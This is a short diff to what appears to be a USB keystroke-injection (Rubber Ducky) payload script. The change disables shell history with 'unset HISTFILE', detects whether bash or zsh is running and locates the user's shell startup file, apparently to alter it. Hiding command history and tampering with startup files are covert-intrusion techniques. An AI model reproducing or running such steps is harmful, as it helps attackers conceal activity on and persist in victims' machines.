@@ -9,15 +9,14 @@
 #!DUCKY!$_JITTER_ENABLED = TRUE
 #!DUCKY!$_JITTER_MAX = 1
 
+unset HISTFILE
+
 export CURRENT_SHELL=''
 CURRENT_SHELL=$(readlink /proc/$$/exe)
 "$CURRENT_SHELL"
 
 [[ "$CURRENT_SHELL" == *"zsh"* ]] && CURRENT_SHELL="zsh"
 [[ "$CURRENT_SHELL" == *"bash"* ]] && CURRENT_SHELL="bash"
-
-[ "$CURRENT_SHELL" = "zsh" ] && unset HISTFILE
-[ "$CURRENT_SHELL" = "bash" ] && set +o history
 
 export CONFIG_FILE=''
 [ "$CURRENT_SHELL" = "zsh" ] && CONFIG_FILE="${ZDOTDIR:-$HOME}/.zshrc"
